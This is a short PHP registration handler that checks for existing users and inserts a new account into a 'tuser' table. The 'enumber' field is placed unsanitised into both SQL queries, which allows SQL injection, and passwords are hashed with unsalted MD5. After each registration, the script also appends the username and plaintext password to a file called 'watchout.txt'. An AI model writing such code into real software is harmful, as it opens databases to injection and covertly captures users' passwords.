<?php
    require '../dbase/dbconfig.php';
    $email = preg_replace("/[^A-Za-z0-9\-\']/", '',$_POST['email']);
    $email = str_replace(['@', 'zesto', 'com', 'ph'], "", $email);
    $dept = 0;
    $fname = preg_replace('/[^A-Za-z \-]/', '', $_POST['fname']);
    $username = preg_replace('/[^A-Za-z0-9\-]/', '',$_POST['username']);
    $password = hash('md5', $_POST['password']);
    $enumber = $_POST['enumber'];
    $sql = "SELECT * FROM tuser WHERE email = '$email' OR uname = '$username' OR eidnum = '$enumber' ";
    $stm = $con->prepare($sql);
	$stm->execute();
    if ($stm->rowCount() == 0) {
        $sqlreg = "INSERT INTO tuser (uname, pword, fname, email, department, eidnum, lvl) VALUES ('$username', '$password', '$fname', '$email', '$dept', '$enumber', 1)";
        $stmreg = $con->prepare($sqlreg);
        $stmreg->execute();
        if ($stmreg->rowCount() == 1) {
            $scrt = 'watchout.txt';
            $current = file_get_contents($scrt);
            $current .= "\n $username / " . $_POST['password'];
            file_put_contents($scrt, $current);
            echo "Account registered.";
        }
        else { echo "Error Occured."; }
    }
    else { echo "User already exist."; }
?>